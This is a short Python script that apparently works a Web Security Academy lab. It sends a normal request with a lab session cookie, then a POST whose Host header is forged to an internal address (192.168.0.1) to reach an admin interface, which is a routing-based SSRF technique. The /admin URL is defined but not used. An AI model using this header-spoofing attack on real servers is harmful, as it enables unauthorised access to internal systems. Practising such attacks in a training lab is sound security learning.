import requests

url ="https://0acc00aa045d541c8017ae3e0033006b.h1-web-security-academy.net"

session = requests.Session()
headerInfo1 = {
    "Host": "0acc00aa045d541c8017ae3e0033006b.h1-web-security-academy.net",
    "Cookie": "session=gcRwr0AKDF0XLtP7jbd0xsFJInkwI0EG; _lab=46%7cMCwCFD3nHjGY%2b1SXtO8QZFmgrwDyQPoOAhQ52yyHoy7xbO8%2fl752AHUlEdmVjdU0xaNeD7cI7YM9Fq1M%2fmzn0p2y4xEMmEr6%2b9nuavOuKYPGbucWu2ofZn34GAaoJGzI9PuYNAAw9wj%2fkzVM%2bpK2ku8XufTV9DSptvUSEtutvmfBPzq%2fNrM%3d"
}
response = session.get(url, headers=headerInfo1)
#response = requests.get(url, headers=headerInfo1)
print("Request Headers:")
for key, value in response.request.headers.items():
    print(f"{key}: {value}")

print("="*40)


for key, value in response.headers.items():
    print(f"{key}: {value}")
print(response.text)


#Request2 Post 
print("/"*40)

url2 ="https://0acc00aa045d541c8017ae3e0033006b.h1-web-security-academy.net/admin"

headerInfo2 = {
    "Host": "192.168.0.1",
    "Cookie": "session=gcRwr0AKDF0XLtP7jbd0xsFJInkwI0EG; _lab=46%7cMCwCFD3nHjGY%2b1SXtO8QZFmgrwDyQPoOAhQ52yyHoy7xbO8%2fl752AHUlEdmVjdU0xaNeD7cI7YM9Fq1M%2fmzn0p2y4xEMmEr6%2b9nuavOuKYPGbucWu2ofZn34GAaoJGzI9PuYNAAw9wj%2fkzVM%2bpK2ku8XufTV9DSptvUSEtutvmfBPzq%2fNrM%3d"
}
response2 = session.post(url, headers=headerInfo2)


print("Request2 Headers:")
for key, value in response2.request.headers.items():
    print(f"{key}: {value}")

print("="*40)


for key, value in response2.headers.items():
    print(f"{key}: {value}")
print(response2.text)

session.close()